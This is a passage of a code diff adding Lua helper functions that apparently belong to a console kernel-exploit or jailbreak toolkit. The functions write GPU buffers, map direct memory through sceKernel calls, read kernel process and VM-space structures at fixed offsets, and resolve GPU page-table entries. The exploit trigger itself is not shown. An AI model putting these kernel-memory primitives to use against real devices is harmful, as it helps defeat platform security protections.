+    gpu.write_buffer(dest, ub8(value):sub(1,2))
+end
+
+function gpu.write_dword(dest, value)
+    gpu.write_buffer(dest, ub8(value):sub(1,4))
+end
+
+function gpu.write_qword(dest, value)
+    gpu.write_buffer(dest, ub8(value):sub(1,8))
+end
+
+
+
+
+
+
+-- misc fns
+
+function alloc_main_dmem(size, prot, flag)
+
+    assert(size and prot)
+
+    local out = memory.alloc(0x8)
+    local mem_type = 1 -- 1-10
+
+    local ret = sceKernelAllocateMainDirectMemory(size, size, mem_type, out):tonumber()
+    if ret ~= 0 then
+        errorf("sceKernelAllocateMainDirectMemory() error %s", hex(ret))
+    end
+
+    local phys_addr = memory.read_qword(out)
+
+    memory.write_qword(out, 0)
+
+    local ret = sceKernelMapDirectMemory(out, size, prot, flag, phys_addr, size):tonumber()
+    if ret ~= 0 then
+        errorf("sceKernelMapDirectMemory() error %s", hex(ret))
+    end
+
+    local virt_addr = memory.read_qword(out)
+    return virt_addr, phys_addr
+end
+
+function get_curproc_vmid()
+    local vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE)
+    local vmid = kernel.read_dword(vmspace + kernel_offset.VMSPACE_VM_VMID)
+    return vmid:tonumber()
+end
+
+function get_gvmspace(vmid)
+    assert(vmid)
+    local gvmspace_base = kernel.addr.data_base + kernel_offset.DATA_BASE_GVMSPACE
+    return gvmspace_base + vmid * kernel_offset.SIZEOF_GVMSPACE
+end
+
+function get_pdb2_addr(vmid)
+    local gvmspace = get_gvmspace(vmid)
+    return kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_PAGE_DIR_VA)
+end
+
+function get_relative_va(vmid, va)
+
+    assert(is_uint64(va))
+
+    local gvmspace = get_gvmspace(vmid)
+
+    local size = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_SIZE)
+    local start_addr = kernel.read_qword(gvmspace + kernel_offset.GVMSPACE_START_VA)
+    local end_addr = start_addr + size
+
+    if va >= start_addr and va < end_addr then
+        return va - start_addr
+    end
+
+    return nil
+end
+
+function get_ptb_entry_of_relative_va(virt_addr)
+
+    local vmid = get_curproc_vmid()
+    local relative_va = get_relative_va(vmid, virt_addr)
+
+    if not relative_va then
+        errorf("invalid virtual addr %s for vmid %d", hex(virt_addr), vmid)
+    end
+
+    return gpu_walk_pt(vmid, relative_va)
+end
+
+=== END ===
